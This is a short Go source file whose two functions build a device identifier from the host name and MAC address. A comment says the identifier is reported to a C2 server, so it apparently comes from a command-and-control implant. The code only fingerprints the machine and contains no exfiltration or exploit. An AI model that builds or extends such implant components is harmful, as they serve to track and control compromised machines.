package main

import (
	"encoding/hex"
	"net"
	"os"
	"strings"
)

// systemIdentifier returns the device identity reported to the C2 server,
// composed of the host name plus a stable machine token derived from the
// primary non-loopback MAC address. e.g. "WIN-PC-3a1b8c..."
func systemIdentifier() string {
	host, err := os.Hostname()
	if err != nil || strings.TrimSpace(host) == "" {
		host = "unknown"
	}
	host = strings.TrimSpace(host)

	token := machineToken()
	if token == "" {
		token = "nomac"
	}

	return host + "-" + token
}

// machineToken derives a stable per-device token from the first non-loopback
// hardware (MAC) address. It avoids external dependencies and works across
// supported platforms.
func machineToken() string {
	ifs, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, i := range ifs {
		if i.Flags&net.FlagLoopback != 0 || len(i.HardwareAddr) == 0 {
			continue
		}
		return strings.ToLower(hex.EncodeToString(i.HardwareAddr))
	}
	return ""
}
